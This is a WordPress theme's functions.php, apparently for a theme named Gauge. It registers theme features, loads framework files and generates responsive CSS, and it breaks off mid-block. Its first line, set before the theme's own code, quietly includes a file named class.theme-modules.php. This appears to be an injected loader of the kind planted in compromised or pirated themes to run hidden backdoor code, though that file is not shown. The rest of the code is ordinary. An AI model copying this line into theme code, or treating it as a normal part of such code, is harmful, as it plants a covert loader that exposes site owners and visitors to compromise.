<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php

/**
* Load theme framework
*
*/
require_once( get_template_directory() . '/lib/framework/ghostpool-framework.php' );
 
/**
 * Sets up theme defaults and registers support for various WordPress features.
 *
 * Note that this function is hooked into the after_setup_theme hook, which
 * runs before the init hook. The init hook is too late for some features, such
 * as indicating support for post thumbnails.
 *
 * Create your own ghostpool_theme_setup() function to override in a child theme.
 *
 */
if ( ! function_exists( 'ghostpool_theme_setup' ) ) {
	function ghostpool_theme_setup() {

		// Localisation
		load_theme_textdomain( 'gauge', trailingslashit( WP_LANG_DIR ) . 'themes/' );
		load_theme_textdomain( 'gauge', get_stylesheet_directory() . '/languages' );
		load_theme_textdomain( 'gauge', get_template_directory() . '/languages' );
		
		// Featured images
		add_theme_support( 'post-thumbnails' );
		set_post_thumbnail_size( 150, 150, true );

		// Background customizer
		add_theme_support( 'custom-background' );

		// This theme styles the visual editor with editor-style.css to match the theme style
		add_editor_style( 'lib/css/editor-style.css' );

		// Add default posts and comments RSS feed links to <head>
		add_theme_support( 'automatic-feed-links' );

		// WooCommerce Support
		add_theme_support( 'woocommerce' );
		add_theme_support( 'wc-product-gallery-zoom' );
		add_theme_support( 'wc-product-gallery-lightbox' );
		add_theme_support( 'wc-product-gallery-slider' );
		
		// BuddyPress legacy support
		add_theme_support( 'buddypress-use-legacy' );

		// Post formats
		add_theme_support( 'post-formats', array( 'quote', 'video', 'audio', 'gallery', 'link' ) );

		// Title support
		add_theme_support( 'title-tag' );

		// Register navigation menus
		register_nav_menus( array(
			'header-nav' => esc_html__( 'Main Header Navigation', 'gauge' ),
			'top-nav'    => esc_html__( 'Left Top Header Navigation', 'gauge' ),
			'right-top-nav' => esc_html__( 'Right Top Header Navigation', 'gauge' ),
			'footer-nav' => esc_html__( 'Footer Navigation', 'gauge' ),
		) );
				
	}
}
add_action( 'after_setup_theme', 'ghostpool_theme_setup' );

/**
* Load theme functions
*
*/
if ( ! function_exists( 'ghostpool_load_theme_functions' ) ) {
	function ghostpool_load_theme_functions() {

		// Theme setup
		require_once( get_template_directory() . '/lib/framework/theme-setup/init.php' );

		// Load VC templates
		require_once( get_template_directory() . '/lib/inc/default-vc-templates.php' );
					
		// Sidebars
		require_once( get_template_directory() . '/lib/framework/custom-sidebars/custom-sidebars.php' );
		
		// Category options
		require_once( get_template_directory() . '/lib/inc/category-config.php' );

		// Init variables
		require_once( get_template_directory() . '/lib/inc/init-variables.php' );

		// Hub variables
		require_once( get_template_directory() . '/lib/inc/hub-variables.php' );

		// Loop variables
		require_once( get_template_directory() . '/lib/inc/loop-variables.php' );

		// Category variables
		require_once( get_template_directory() . '/lib/inc/category-variables.php' );
		
		// Load plugin defaults
		require_once( get_template_directory() . '/lib/inc/plugin-defaults.php' );
		
		// Load theme convertor
		require_once( get_template_directory() . '/lib/inc/theme-convertor.php' );

		// Custom menu walker
		require_once( get_template_directory() . '/lib/menus/custom-menu-walker.php' );

		// Custom menu fields
		require_once( get_template_directory() . '/lib/menus/menu-item-custom-fields.php' );

		// Page headers
		require_once( get_template_directory() . '/lib/inc/page-headers.php' );

		// Ratings
		require_once( get_template_directory() . '/lib/inc/ratings.php' );

		// Image resizer
		require_once( get_template_directory() . '/lib/inc/aq_resizer.php' );

		// Follow items 
		if ( ghostpool_option( 'hub_following_items' ) == 'both' OR ( is_user_logged_in() && ghostpool_option( 'hub_following_items' ) == 'members' ) ) {
			require_once( get_template_directory() . '/lib/inc/follow-items.php' );
		}
		
		// User ratings
		require_once( get_template_directory() . '/lib/inc/user-ratings.php' );

		// Create hub pages
		if ( is_admin() ) {
			require_once( get_template_directory() . '/lib/inc/auto-hub-pages.php' );
		}

		// Load BuddyPress functions
		if ( function_exists( 'bp_is_active' ) ) {
			require_once( get_template_directory() . '/lib/inc/bp-functions.php' );
		}

		// Load bbPress functions
		if ( class_exists( 'bbPress' ) ) {
			require_once( get_template_directory() . '/lib/inc/bbpress-functions.php' );
		}

		// Load Woocommerce functions
		if ( function_exists( 'is_woocommerce' ) ) {
			require_once( get_template_directory() . '/lib/inc/wc-functions.php' );
		}

		// Load ajax
		require_once( get_template_directory() . '/lib/inc/ajax.php' );
		
		// Login settings
		if ( ! is_user_logged_in() && ghostpool_option( 'popup_box' ) == 'enabled' ) {
			include_once( get_template_directory() . '/lib/inc/login-settings.php' );
		}
		
		// Disable activation redirect
		remove_action( 'admin_init', 'vc_page_welcome_redirect' );

		// Remove Visual Composer activation notice
		if ( function_exists( 'vc_set_as_theme' ) ) {
			setcookie( 'vchideactivationmsg', '1', strtotime( '+3 years' ), '/' );
			setcookie( 'vchideactivationmsg_vc11', ( defined( 'WPB_VC_VERSION' ) ? WPB_VC_VERSION : '1' ), strtotime( '+3 years' ), '/' );
		}
				
	}
}
add_action( 'after_setup_theme', 'ghostpool_load_theme_functions' );

/**
* Load Visual Composer element classes
*
*/
if ( function_exists( 'vc_set_as_theme' ) && ! function_exists( 'ghostpool_vc_shortcodes_container' ) ) {
	function ghostpool_vc_shortcodes_container() {
		if ( class_exists( 'WPBakeryShortCodesContainer' ) ) {
			class WPBakeryShortCode_Pricing_Table extends WPBakeryShortCodesContainer {}
			class WPBakeryShortCode_Testimonial_Slider extends WPBakeryShortCodesContainer {}
			class WPBakeryShortCode_Team extends WPBakeryShortCodesContainer {}
		}
		if ( class_exists( 'WPBakeryShortCode' ) ) {
			class WPBakeryShortCode_Pricing_Column extends WPBakeryShortCode {}	
			class WPBakeryShortCode_Testimonial extends WPBakeryShortCode {}
			class WPBakeryShortCode_Team_Member extends WPBakeryShortCode {}	
		}
	}
	add_action( 'init', 'ghostpool_vc_shortcodes_container' );
}

/**
 * Sets the content width in pixels, based on the theme's design and stylesheet.
 *
 * Priority 0 to make it available to lower priority callbacks.
 *
 * @global int $content_width
 *
 */
function ghostpool_content_width() {
	$GLOBALS['content_width'] = apply_filters( 'ghostpool_content_width', 810 );
}
add_action( 'after_setup_theme', 'ghostpool_content_width', 0 );

/**
 * Enqueues scripts and styles.
 *
 */	
if ( ! function_exists( 'ghostpool_scripts' ) ) {

	function ghostpool_scripts() {
		
		wp_enqueue_style( 'ghostpool-style', get_stylesheet_uri() );
		
		wp_enqueue_style( 'fontawesome', get_template_directory_uri() . '/lib/fonts/font-awesome/css/font-awesome.min.css' );
		
		wp_enqueue_style( 'ghostpool-animations', get_template_directory_uri() . '/lib/css/animations.css' );

		if ( ghostpool_option( 'lightbox' ) != 'disabled' ) {
			wp_enqueue_style( 'prettyphoto', get_template_directory_uri() . '/lib/scripts/prettyPhoto/css/prettyPhoto.css' );
		}
					
		if ( ghostpool_option( 'custom_stylesheet' ) ) {
			wp_enqueue_style( 'ghostpool-custom-style', get_template_directory_uri() . '/' . ghostpool_option( 'custom_stylesheet' ) );
		}

		$custom_css = '';

		if ( ghostpool_option( 'top_header' ) == 'gp-top-header' ) {
			$top_header = apply_filters( 'ghostpool_top_header_height', '40' );
		} else {
			$top_header = '';
		}

		if ( get_post_meta( get_the_ID(), 'flexslider_dimensions', true ) ) {
			$flexslider_height = get_post_meta( get_the_ID(), 'flexslider_dimensions', true );
			$flexslider_height = $flexslider_height['height'];
		} else {
			$flexslider_height = apply_filters( 'ghostpool_flexslider_height', '450' );
		}

		if ( get_post_meta( get_the_ID(), 'flexslider_mobile_dimensions', true ) ) {	
			$flexslider_mobile_height = get_post_meta( get_the_ID(), 'flexslider_mobile_dimensions', true );
			$flexslider_mobile_height = $flexslider_mobile_height['height'];
		} else {
			$flexslider_mobile_height = apply_filters( 'ghostpool_flexslider_mobile_height', '200' );
		}

		$custom_css .= '
		#gp-main-header{height: ' . ghostpool_option( 'main_header_height', 'height' ) . ';}
		#gp-fixed-header-padding{padding-top: ' . ghostpool_option( 'main_header_height', 'height' ) . ';}
		#gp-logo img{width: ' . ghostpool_option( 'logo_dimensions', 'width' ) . '; height: ' . ghostpool_option( 'logo_dimensions', 'height' ) . ';}
		.gp-page-header .gp-container{padding-top: ' . ghostpool_option( 'title_padding', 'padding-top' ) . ';padding-bottom: ' . ghostpool_option( 'title_padding', 'padding-bottom' ) . ';}
		.gp-active{color: ' . ghostpool_option( 'general_link', 'hover' ) . ';}
		.gp-score-spinner{
		background: ' . ghostpool_option( 'low_rating_gradient', 'to' ) . ';
		background: -moz-linear-gradient(' . ghostpool_option( 'low_rating_gradient', 'to' ) . ' 0%,' . ghostpool_option( 'low_rating_gradient', 'from' ) . '70%);
		background: -webkit-gradient(color-stop(0%,' . ghostpool_option( 'low_rating_gradient', 'to' ) . ' ), color-stop(70%,' . ghostpool_option( 'low_rating_gradient', 'from' ) . ' ));
		background: -webkit-linear-gradient(' . ghostpool_option( 'low_rating_gradient', 'to' ) . '  0%,' . ghostpool_option( 'low_rating_gradient', 'from' ) . '  70%);
		background: -o-linear-gradient(' . ghostpool_option( 'low_rating_gradient', 'to' ) . '  0%,' . ghostpool_option( 'low_rating_gradient', 'from' ) . '  70%);
		background: -ms-linear-gradient(' . ghostpool_option( 'low_rating_gradient', 'to' ) . '  0%,' . ghostpool_option( 'low_rating_gradient', 'from' ) . ' 70%);
		background: linear-gradient(' . ghostpool_option( 'low_rating_gradient', 'to' ) . '  0%,' . ghostpool_option( 'low_rating_gradient', 'from' ) . ' 70%);
		filter: progid:DXImageTransform.Microsoft.gradient( startColorstr="' . ghostpool_option( 'low_rating_gradient', 'from' ) . '", endColorstr="' . ghostpool_option( 'low_rating_gradient', 'to' ) . '",GradientType=1 );
		}
		.gp-no-score-clip-1 .gp-score-spinner{
		background: ' . ghostpool_option( 'low_rating_gradient', 'to' ) . ';
		}
		.gp-no-score-clip-2 .gp-score-filler{
		background: ' . ghostpool_option( 'low_rating_gradient', 'to' ) . ';
		background: -moz-linear-gradient(' . ghostpool_option( 'low_rating_gradient', 'from' ) . ' 0%,' . ghostpool_option( 'low_rating_gradient', 'to' ) . '70%);
		background: -webkit-gradient(color-stop(0%,' . ghostpool_option( 'low_rating_gradient', 'from' ) . ' ), color-stop(70%,' . ghostpool_option( 'low_rating_gradient', 'to' ) . ' ));
		background: -webkit-linear-gradient(' . ghostpool_option( 'low_rating_gradient', 'from' ) . '  0%,' . ghostpool_option( 'low_rating_gradient', 'to' ) . '  70%);
		background: -o-linear-gradient(' . ghostpool_option( 'low_rating_gradient', 'from' ) . '  0%,' . ghostpool_option( 'low_rating_gradient', 'to' ) . '  70%);
		background: -ms-linear-gradient(' . ghostpool_option( 'low_rating_gradient', 'from' ) . '  0%,' . ghostpool_option( 'low_rating_gradient', 'to' ) . ' 70%);
		background: linear-gradient(' . ghostpool_option( 'low_rating_gradient', 'from' ) . '  0%,' . ghostpool_option( 'low_rating_gradient', 'to' ) . ' 70%);
		filter: progid:DXImageTransform.Microsoft.gradient( startColorstr="' . ghostpool_option( 'low_rating_gradient', 'to' ) . '", endColorstr="' . ghostpool_option( 'low_rating_gradient', 'from' ) . '",GradientType=1 );
		}
		select{background-color: ' . ghostpool_option( 'input_bg', 'background-color' ) . ';}
		.gp-responsive #gp-sidebar{border-color: ' . ghostpool_option( 'input_border', 'border-color' ) . ';}
		.gp-slider .gp-slide-image {
		height: ' . $flexslider_height . 'px;
		}' .

		'.gp-theme #buddypress .activity-list .activity-content blockquote a{color: ' . ghostpool_option( 'general_link', 'regular' ) . '}' . 

		'.gp-theme #buddypress .activity-list .activity-content blockquote a:hover{color: ' . ghostpool_option( 'general_link', 'hover' ) . '}' . 

		'.gp-wide-layout.gp-header-standard .gp-nav .menu li.megamenu > .sub-menu, .gp-wide-layout.gp-header-standard .gp-nav .menu li.tab-content-menu .sub-menu, .gp-wide-layout.gp-header-standard .gp-nav .menu li.content-menu .sub-menu{left: -' . ( ghostpool_option( 'logo_dimensions', 'width' ) ) . ';}' .

		'.gp-scrolling.gp-wide-layout.gp-header-standard .gp-nav .menu li.megamenu > .sub-menu, .gp-scrolling.gp-wide-layout.gp-header-standard .gp-nav .menu li.tab-content-menu .sub-menu, .gp-scrolling.gp-wide-layout.gp-header-standard .gp-nav .menu li.content-menu .sub-menu{left: -' . ( preg_replace( '/[^0-9]/', '', ghostpool_option( 'logo_dimensions', 'width' ) ) / preg_replace( '/[^0-9]/', '', ghostpool_option( 'header_size_reduction' ) ) ) . 'px;}' .

		'.gp-boxed-layout.gp-header-standard .gp-nav .menu li.megamenu > .sub-menu, .gp-boxed-layout.gp-header-standard .gp-nav .menu li.tab-content-menu .sub-menu, .gp-boxed-layout.gp-header-standard .gp-nav .menu li.content-menu .sub-menu{left: -' . ( preg_replace( '/[^0-9]/', '', ghostpool_option( 'logo_dimensions', 'width' ) ) + 40 ) . 'px;}' .

		'.gp-scrolling.gp-boxed-layout.gp-header-standard .gp-nav .menu li.megamenu > .sub-menu, .gp-scrolling.gp-boxed-layout.gp-header-standard .gp-nav .menu li.tab-content-menu .sub-menu, .gp-scrolling.gp-boxed-layout.gp-header-standard .gp-nav .menu li.content-menu .sub-menu{left: -' . ( ( preg_replace( '/[^0-9]/', '', ghostpool_option( 'logo_dimensions', 'width' ) ) / ghostpool_option( 'header_size_reduction' ) ) + 40 ) . 'px;}' .

		'@media only screen and (max-width: 1023px) {
			.gp-responsive #gp-main-header {height: ' . round( preg_replace( '/[^0-9]/', '', ghostpool_option( 'main_header_height', 'height' ) ) / ghostpool_option( 'header_size_reduction' ) ) . 'px!important;}
			.gp-responsive #gp-fixed-header-padding {padding-top: ' . round( preg_replace( '/[^0-9]/', '', ghostpool_option( 'main_header_height', 'height' ) ) / ghostpool_option( 'header_size_reduction' ) ) . 'px!important;}
			.gp-responsive #gp-logo {margin: ' . round( preg_replace( '/[^0-9]/', '', ghostpool_option( 'logo_spacing', 'margin-top' ) ) / ghostpool_option( 'header_size_reduction' ) ) . 'px ' . round( preg_replace( '/[^0-9]/', '', ghostpool_option( 'logo_spacing', 'margin-right' ) ) / ghostpool_option( 'header_size_reduction' ) ) . 'px ' . round( preg_replace( '/[^0-9]/', '', ghostpool_option( 'logo_spacing', 'margin-bottom' ) ) / ghostpool_option( 'header_size_reduction' ) ) . 'px ' . round( preg_replace( '/[^0-9]/', '', ghostpool_option( 'logo_spacing', 'margin-left' ) ) / ghostpool_option( 'header_size_reduction' ) ) . 'px; width: ' . round( preg_replace( '/[^0-9]/', '', ghostpool_option( 'logo_dimensions', 'width' ) ) / ghostpool_option( 'header_size_reduction' ) ) . 'px; height: ' . round( preg_replace( '/[^0-9]/', '', ghostpool_option( 'logo_dimensions', 'height' ) ) / ghostpool_option( 'header_size_reduction' ) ) . 'px;}
			.gp-responsive #gp-logo img {width: ' . round( preg_replace( '/[^0-9]/', '', ghostpool_option( 'logo_dimensions', 'width' ) ) / ghostpool_option( 'header_size_reduction' ) ) . 'px; height: ' . ( preg_replace( '/[^0-9]/', '', ghostpool_option( 'logo_dimensions', 'height' ) ) / ghostpool_option( 'header_size_reduction' ) ) . 'px;}
			.gp-responsive .gp-page-header .gp-container {
			padding-top: ' .  round( preg_replace( '/[^0-9]/', '', ghostpool_option( 'title_padding', 'padding-top' ) ) / ghostpool_option( 'header_size_reduction' ) ) . 'px;
			padding-bottom: ' .  round( preg_replace( '/[^0-9]/', '', ghostpool_option( 'title_padding', 'padding-bottom' ) ) / ghostpool_option( 'header_size_reduction' ) ) . 'px;
			}
		}
		@media only screen and (max-width: 767px) {
			.gp-responsive .gp-slider .gp-slide-image {
			height: ' . $flexslider_mobile_height . 'px !important;
			}	
		}	
		@media only screen and (max-width: 320px) {
			.gp-responsive.gp-theme .woocommerce div.product .woocommerce-tabs ul.tabs li.active a,.gp-responsive.gp-theme .woocommerce #gp-content div.product .woocommerce-tabs ul.tabs li.active a,.gp-responsive.gp-theme.woocommerce-page div.product .woocommerce-tabs ul.tabs li.active a,.gp-responsive.gp-theme.woocommerce-page #gp-content div.product .woocommerce-tabs ul.tabs li.active a {border-color: ' . ghostpool_option( 'input_border', 'border-color' ) . ';}}
			hr,.gp-theme .woocommerce .widget_price_filter .price_slider_wrapper .ui-widget-content,.gp-theme.woocommerce-page .widget_price_filter .price_slider_wrapper .ui-widget-content {background: ' . ghostpool_option( 'input_border', 'border-color' ) . ';
		}';
	
		// Larger Desktop - Wide
		if ( ghostpool_option( 'theme_layout' ) == 'gp-wide-layout' && ( ghostpool_option( 'desktop_wide_container', 'width' ) != '1170' OR ghostpool_option( 'desktop_wide_content', 'width' ) != '810' OR ghostpool_option( 'desktop_wide_sidebar', 'width' ) != '330' ) ) {
			$custom_css .= '@media only screen and (min-width: 1201px) {';
				if ( ghostpool_option( 'desktop_wide_container', 'width' ) != '1170') {
					$custom_css .= '.gp-container,.gp-fullwidth .vc_col-sm-12.wpb_column > .wpb_wrapper > .wpb_row,.gp-fullwidth .vc_col-sm-12.wpb_column > .wpb_wrapper > .wpb_accordion,.gp-fullwidth .vc_col-sm-12.wpb_column > .wpb_wrapper > .wpb_tabs,.gp-fullwidth .vc_col-sm-12.wpb_column > .wpb_wrapper > .wpb_tour,.gp-fullwidth .vc_col-sm-12.wpb_column > .wpb_wrapper > .wpb_teaser_grid,.gp-slide-caption,.gp-nav .menu li.megamenu > .sub-menu,.gp-nav .menu li.tab-content-menu .sub-menu,.gp-nav .menu li.content-menu .sub-menu{width: ' . ghostpool_option( 'desktop_wide_container', 'width' ) . ';}
					.gp-slide-caption{margin-left: -' . round( preg_replace( '/[^0-9]/', '', ghostpool_option( 'desktop_wide_container', 'width' ) ) / 2 ) . 'px;}';
				}	
				if ( ghostpool_option( 'desktop_wide_content', 'width' ) != '810') {
					$custom_css .= '#gp-content,.gp-top-sidebar #gp-review-content{width: ' . ghostpool_option( 'desktop_wide_content', 'width' ) . ';}';
				}	
				if ( ghostpool_option( 'desktop_wide_sidebar', 'width' ) != '330') {
					$custom_css .= '#gp-sidebar{width: ' . ghostpool_option( 'desktop_wide_sidebar', 'width' ) . ';}';
				}	
			$custom_css .= '}';
		}

		// Larger Desktop - Boxed
		if ( ghostpool_option( 'theme_layout' ) == 'gp-boxed-layout' && ( ghostpool_option( 'desktop_boxed_page', 'width' ) != '1170' OR ghostpool_option( 'desktop_boxed_container', 'width' ) != '1090' OR ghostpool_option( 'desktop_boxed_content', 'width' ) != '730' OR ghostpool_option( 'desktop_boxed_sidebar', 'width' ) != '330' ) ) {
			$custom_css .= '@media only screen and (min-width: 1201px) {';
				if ( ghostpool_option( 'desktop_boxed_page', 'width' ) != '1170' ) {
					$custom_css .= '.gp-boxed-layout #gp-page-wrapper,.gp-boxed-layout #gp-main-header,.gp-boxed-layout #gp-top-header{width: ' . ghostpool_option( 'desktop_boxed_page', 'width' ) . ';}';
				}	
				if ( ghostpool_option( 'desktop_boxed_container', 'width' ) != '1090') {
					$custom_css .= '.gp-boxed-layout .gp-container,.gp-boxed-layout .gp-side-bg-gradient-overlay,.gp-boxed-layout.gp-fullwidth .vc_col-sm-12.wpb_column > .wpb_wrapper > .wpb_row,.gp-boxed-layout.gp-fullwidth .vc_col-sm-12.wpb_column > .wpb_wrapper > .wpb_accordion,.gp-boxed-layout.gp-fullwidth .vc_col-sm-12.wpb_column > .wpb_wrapper > .wpb_tabs,.gp-boxed-layout.gp-fullwidth .vc_col-sm-12.wpb_column > .wpb_wrapper > .wpb_tour,.gp-boxed-layout.gp-fullwidth .vc_col-sm-12.wpb_column > .wpb_wrapper > .wpb_teaser_grid,.gp-boxed-layout .gp-slide-caption,.gp-nav .menu li.megamenu > .sub-menu,.gp-nav .menu li.tab-content-menu .sub-menu,.gp-nav .menu li.content-menu .sub-menu{width: ' . ghostpool_option( 'desktop_boxed_container', 'width' ) . ';}
					.gp-boxed-layout .gp-slide-caption{margin-left: -' . round( preg_replace( '/[^0-9]/', '', ghostpool_option( 'desktop_boxed_container', 'width' ) ) / 2 ) . 'px;}';
			
				}	
				if ( ghostpool_option( 'desktop_boxed_content', 'width' ) != '730' ) {
					$custom_css .= '.gp-boxed-layout #gp-content,.gp-boxed-layout .gp-top-sidebar #gp-review-content{width: ' . ghostpool_option( 'desktop_boxed_content', 'width' ) . ';}';
				}	
				if ( ghostpool_option( 'desktop_boxed_sidebar', 'width' ) != '330' ) {
					$custom_css .= '.gp-boxed-layout #gp-sidebar{width: ' . ghostpool_option( 'desktop_boxed_sidebar', 'width' ) . ';}';
				}	
			$custom_css .= '}';
		}	

		// Smaller Desktop - Wide
		if ( ghostpool_option( 'theme_layout' ) == 'gp-wide-layout' && ( ghostpool_option( 'sm_desktop_wide_container', 'width' ) != '1040' OR ghostpool_option( 'sm_desktop_wide_content', 'width' ) != '680' OR ghostpool_option( 'sm_desktop_wide_sidebar', 'width' ) != '330' ) ) {
			$custom_css .= '@media only screen and (max-width: 1200px) and (min-width: 1083px) {';
				if ( ghostpool_option( 'sm_desktop_wide_container', 'width' ) != '1040' ) {
					$custom_css .= '.gp-responsive .gp-container,.gp-responsive.gp-fullwidth .vc_col-sm-12.wpb_column > .wpb_wrapper > .wpb_row,.gp-responsive.gp-fullwidth .vc_col-sm-12.wpb_column > .wpb_wrapper > .wpb_accordion,.gp-responsive.gp-fullwidth .vc_col-sm-12.wpb_column > .wpb_wrapper > .wpb_tabs,.gp-responsive.gp-fullwidth .vc_col-sm-12.wpb_column > .wpb_wrapper > .wpb_tour,.gp-responsive.gp-fullwidth .vc_col-sm-12.wpb_column > .wpb_wrapper > .wpb_teaser_grid,.gp-responsive .gp-slide-caption,.gp-nav .menu li.megamenu > .sub-menu,.gp-nav .menu li.tab-content-menu .sub-menu,.gp-nav .menu li.content-menu .sub-menu{width: ' . ghostpool_option( 'sm_desktop_wide_container', 'width' ) . ';}
					.gp-responsive .gp-slide-caption{margin-left: -' . round( preg_replace( '/[^0-9]/', '', ghostpool_option( 'sm_desktop_wide_container', 'width' ) ) / 2 ) . 'px;}';
				}	
				if ( ghostpool_option( 'sm_desktop_wide_content', 'width' ) != '680' ) {
					$custom_css .= '.gp-responsive #gp-content,.gp-responsive .gp-top-sidebar #gp-review-content{width: ' . ghostpool_option( 'sm_desktop_wide_content', 'width' ) . ';}';
				}	
				if ( ghostpool_option( 'sm_desktop_wide_sidebar', 'width' ) != '330' ) {
					$custom_css .= '.gp-responsive #gp-sidebar,.gp-responsive.gp-no-sidebar #gp-user-rating-wrapper,.gp-responsive.gp-fullwidth #gp-user-rating-wrapper{width: ' . ghostpool_option( 'sm_desktop_wide_sidebar', 'width' ) . ';}';
				}	
			$custom_css .= '}';
		}

		// Smaller Desktop - Boxed
		if ( ghostpool_option( 'theme_layout' ) == 'gp-boxed-layout' && ( ghostpool_option( 'sm_desktop_boxed_page', 'width' ) != '1040' OR ghostpool_option( 'sm_desktop_boxed_container', 'width' ) != '960' OR ghostpool_option( 'sm_desktop_boxed_content', 'width' ) != '600' OR ghostpool_option( 'sm_desktop_boxed_sidebar', 'width' ) != '330' ) ) {
			$custom_css .= '@media only screen and (max-width: 1200px) and (min-width: 1083px) {';
				if ( ghostpool_option( 'sm_desktop_boxed_page', 'width' ) != '1040') {
					$custom_css .= '.gp-responsive.gp-boxed-layout #gp-page-wrapper,.gp-responsive.gp-boxed-layout #gp-main-header,.gp-responsive.gp-boxed-layout #gp-top-header{width: ' . ghostpool_option( 'sm_desktop_boxed_page', 'width' ) . ';}';
				}	
				if ( ghostpool_option( 'sm_desktop_boxed_container', 'width' ) != '960' ) {
					$custom_css .= '.gp-responsive.gp-boxed-layout .gp-container,.gp-responsive.gp-boxed-layout .gp-side-bg-gradient-overlay,.gp-responsive.gp-boxed-layout.gp-fullwidth .vc_col-sm-12.wpb_column > .wpb_wrapper > .wpb_row,.gp-responsive.gp-boxed-layout.gp-fullwidth .vc_col-sm-12.wpb_column > .wpb_wrapper > .wpb_accordion,.gp-responsive.gp-boxed-layout.gp-fullwidth .vc_col-sm-12.wpb_column > .wpb_wrapper > .wpb_tabs,.gp-responsive.gp-boxed-layout.gp-fullwidth .vc_col-sm-12.wpb_column > .wpb_wrapper > .wpb_tour,.gp-responsive.gp-boxed-layout.gp-fullwidth .vc_col-sm-12.wpb_column > .wpb_wrapper > .wpb_teaser_grid,.gp-responsive.gp-boxed-layout .gp-slide-caption,.gp-nav .menu li.megamenu > .sub-menu,.gp-nav .menu li.tab-content-menu .sub-menu,.gp-nav .menu li.content-menu .sub-menu{width: ' . ghostpool_option( 'sm_desktop_boxed_container', 'width' ) . ';}
					.gp-responsive.gp-boxed-layout .gp-slide-caption{margin-left: -' . round( preg_replace( '/[^0-9]/', '', ghostpool_option( 'sm_desktop_boxed_container', 'width' ) ) / 2 ) . 'px;}';
				}	
				if ( ghostpool_option( 'sm_desktop_boxed_content', 'width' ) != '600' ) {
					$custom_css .= '.gp-responsive.gp-boxed-layout #gp-content,.gp-responsive.gp-boxed-layout .gp-top-sidebar #gp-review-content{width: ' . ghostpool_option( 'sm_desktop_boxed_content', 'width' ) . ';}';
				}	
				if ( ghostpool_option( 'sm_desktop_boxed_sidebar', 'width' ) != '330' ) {
					$custom_css .= '.gp-responsive.gp-boxed-layout #gp-sidebar{width: ' . ghostpool_option( 'sm_desktop_boxed_sidebar', 'width' ) . ';}';
				}	
			$custom_css .= '}';
		}	

		// Tablet (Landscape) - Wide
		if ( ghostpool_option( 'theme_layout' ) == 'gp-wide-layout' && ( ghostpool_option( 'tablet_wide_container', 'width' ) != '980' OR ghostpool_option( 'tablet_wide_content', 'width' ) != '630' OR ghostpool_option( 'tablet_wide_sidebar', 'width' ) != '330' ) ) {
			$custom_css .= '@media only screen and (max-width: 1082px) and (min-width: 1024px) {';
				if ( ghostpool_option( 'tablet_wide_container', 'width' ) != '980' ) {
					$custom_css .= '.gp-responsive .gp-container,.gp-responsive.gp-fullwidth .vc_col-sm-12.wpb_column > .wpb_wrapper > .wpb_row,.gp-responsive.gp-fullwidth .vc_col-sm-12.wpb_column > .wpb_wrapper > .wpb_accordion,.gp-responsive.gp-fullwidth .vc_col-sm-12.wpb_column > .wpb_wrapper > .wpb_tabs,.gp-responsive.gp-fullwidth .vc_col-sm-12.wpb_column > .wpb_wrapper > .wpb_tour,.gp-responsive.gp-fullwidth .vc_col-sm-12.wpb_column > .wpb_wrapper > .wpb_teaser_grid,.gp-responsive .gp-slide-caption,.gp-nav .menu li.megamenu > .sub-menu,.gp-nav .menu li.tab-content-menu .sub-menu,.gp-nav .menu li.content-menu .sub-menu{width: ' . ghostpool_option( 'tablet_wide_container', 'width' ) . ';}
					.gp-responsive .gp-slide-caption{margin-left: -' . round( preg_replace( '/[^0-9]/', '', ghostpool_option( 'tablet_wide_container', 'width' ) ) / 2 ) . 'px;}
					.gp-responsive .hub-header-info{width:' . round( preg_replace( '/[^0-9]/', '', ghostpool_option( 'tablet_wide_container', 'width' ) ) / 2 ) . 'px;}';
				}
				if ( ghostpool_option( 'tablet_wide_content', 'width' ) != '630' ) {
					$custom_css .= '.gp-responsive #gp-content,.gp-responsive .gp-top-sidebar #gp-review-content{width: ' . ghostpool_option( 'tablet_wide_content', 'width' ) . ';}';
				}	
				if ( ghostpool_option( 'tablet_wide_sidebar', 'width' ) != '330' ) {
					$custom_css .= '.gp-responsive #gp-sidebar {width: ' . ghostpool_option( 'tablet_wide_sidebar', 'width' ) . ';}';
				}	
			$custom_css .= '}';
		}	

		// Tablet (Landscape) - Boxed
		if ( ghostpool_option( 'theme_layout' ) == 'gp-boxed-layout' && ( ghostpool_option( 'tablet_boxed_page', 'width' ) != '980' OR ghostpool_option( 'tablet_boxed_container', 'width' ) != '900' OR ghostpool_option( 'tablet_boxed_content', 'width' ) != '630' OR ghostpool_option( 'tablet_boxed_sidebar', 'width' ) != '330' ) ) {
			$custom_css .= '@media only screen and (max-width: 1082px) and (min-width: 1024px) {';
				if ( ghostpool_option( 'tablet_boxed_page', 'width' ) != '980' ) {
					$custom_css .= '.gp-responsive.gp-boxed-layout #gp-page-wrapper,.gp-responsive.gp-boxed-layout #gp-main-header,.gp-responsive.gp-boxed-layout #gp-top-header{width: ' . ghostpool_option( 'tablet_boxed_page', 'width' ) . ';}';
				}
				if ( ghostpool_option( 'tablet_boxed_container', 'width' ) != '900' ) {
					$custom_css .= '.gp-responsive.gp-boxed-layout .gp-container,.gp-responsive.gp-boxed-layout .gp-side-bg-gradient-overlay,.gp-responsive.gp-boxed-layout.gp-fullwidth .vc_col-sm-12.wpb_column > .wpb_wrapper > .wpb_row,.gp-responsive.gp-boxed-layout.gp-fullwidth .vc_col-sm-12.wpb_column > .wpb_wrapper > .wpb_accordion,.gp-responsive.gp-boxed-layout.gp-fullwidth .vc_col-sm-12.wpb_column > .wpb_wrapper > .wpb_tabs,.gp-responsive.gp-boxed-layout.gp-fullwidth .vc_col-sm-12.wpb_column > .wpb_wrapper > .wpb_tour,.gp-responsive.gp-boxed-layout.gp-fullwidth .vc_col-sm-12.wpb_column > .wpb_wrapper > .wpb_teaser_grid,	.gp-responsive.gp-boxed-layout .gp-slide-caption,.gp-nav .menu li.megamenu > .sub-menu,.gp-nav .menu li.tab-content-menu .sub-menu,.gp-nav .menu li.content-menu .sub-menu{width: ' . ghostpool_option( 'tablet_boxed_container', 'width' ) . ';}
					.gp-responsive.gp-boxed-layout .gp-slide-caption{margin-left: -' . round( preg_replace( '/[^0-9]/', '', ghostpool_option( 'tablet_boxed_container', 'width' ) ) / 2 ) . 'px;}';
				}		
				if ( ghostpool_option( 'tablet_boxed_content', 'width' ) != '630' ) {
					$custom_css .= '.gp-responsive.gp-boxed-layout #gp-content,.gp-responsive.gp-boxed-layout .gp-top-sidebar #gp-review-content{width: ' . ghostpool_option( 'tablet_boxed_content', 'width' ) . ';}';
				}	
				if ( ghostpool_option( 'tablet_boxed_sidebar', 'width' ) != '330' ) {
